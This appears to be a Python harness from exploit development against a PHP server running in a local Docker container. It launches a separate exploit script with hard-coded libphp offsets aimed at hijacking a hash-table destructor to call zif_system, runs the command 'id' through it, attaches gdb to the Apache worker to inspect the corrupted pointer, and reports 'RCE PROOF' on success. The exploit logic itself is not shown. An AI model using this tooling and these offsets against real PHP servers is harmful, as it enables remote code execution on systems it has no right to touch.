import subprocess, sys, time, os, re

BASE = r"C:\Users\likat\p2s52704"
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Clean
sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

# Run exploit with P2S_PAUSE=60
env = os.environ.copy()
env["P2S_PAUSE"] = "60"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break

if not pause_hit:
    proc.wait()
    sys.exit(1)

print("\n[*] PAUSE - setting up gdb...", flush=True)
time.sleep(1)

# Get worker PID
r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1] if pids else None
print(f"[*] worker PID: {worker_pid}", flush=True)

# Find libphp base
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
maps_line = r.stdout.strip()
if not maps_line:
    print("[!] no libphp in maps"); proc.kill(); sys.exit(1)
maps_base = int(maps_line.split("-")[0], 16)
zif_addr = maps_base + 0x3ac080
# zend_hash_graceful_reverse_destroy at 0x4b47d0
hash_destroy_addr = maps_base + 0x4b47d0
print(f"[*] libphp base: {hex(maps_base)}", flush=True)
print(f"[*] zif_system:  {hex(zif_addr)}", flush=True)
print(f"[*] zend_hash_graceful_reverse_destroy: {hex(hash_destroy_addr)}", flush=True)

# GDB script: breakpoint on zend_hash_graceful_reverse_destroy
# When hit: print rdi (HashTable ptr), then read pDestructor at rdi+0x30
gdb_script = (
    "set pagination off\n"
    "set confirm off\n"
    "set width 0\n"
    f"break *{hex(hash_destroy_addr)}\n"
    "commands\n"
    "  silent\n"
    "  echo ===== zend_hash_graceful_reverse_destroy HIT =====\\n\n"
    "  printf \"HashTable ptr (rdi) = \", rdi\n"
    "  printf \"pDestructor at rdi+0x30 = \", *(unsigned long*)(rdi+0x30)\n"
    "  printf \"nNumUsed at rdi+0x18 = \", *(unsigned int*)(rdi+0x18)\n"
    "  printf \"nNumOfElements at rdi+0x1c = \", *(unsigned int*)(rdi+0x1c)\n"
    "  printf \"arData at rdi+0x10 = \", *(unsigned long*)(rdi+0x10)\n"
    f"  printf \"zif_system expected = {hex(zif_addr)}\\n\"\n"
    "  bt 10\n"
    "  echo ===== end =====\\n\n"
    "  detach\n"
    "end\n"
    "continue\n"
)
gdb_local = os.path.join(BASE, "gdb_hash_destroy.gdb")
with open(gdb_local, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gdb_local}" {c}:/tmp/gdb_hash_destroy.gdb')

# Also set a second breakpoint on zif_system (in case it IS called)
# Attach gdb
print("[*] attaching gdb...", flush=True)
gdb_proc = subprocess.Popen(
    f'docker exec {c} timeout 55 gdb -batch -x /tmp/gdb_hash_destroy.gdb -p {worker_pid}',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, bufsize=1
)

time.sleep(3)
print("[*] waiting for exploit to finish...", flush=True)

try:
    out, _ = proc.communicate(timeout=120)
    tail = out[-2000:] if len(out) > 2000 else out
    print(tail, flush=True)
except subprocess.TimeoutExpired:
    proc.kill()
    out, _ = proc.communicate()
    tail = out[-2000:] if len(out) > 2000 else out
    print(tail, flush=True)

try:
    gdb_out, _ = gdb_proc.communicate(timeout=15)
    print("\n=== GDB OUTPUT ===", flush=True)
    print(gdb_out[-4000:] if len(gdb_out) > 4000 else gdb_out, flush=True)
except subprocess.TimeoutExpired:
    gdb_proc.kill()
    gdb_out, _ = gdb_proc.communicate()
    print("\n=== GDB OUTPUT (timeout) ===", flush=True)
    print(gdb_out[-4000:] if len(gdb_out) > 4000 else gdb_out, flush=True)

r = sh(f'docker exec {c} cat /www/p1 2>/dev/null')
if r.stdout.strip():
    print(f"\n[+] RCE PROOF: {r.stdout.strip()[:80]}", flush=True)
else:
    print("\n[-] no RCE proof", flush=True)
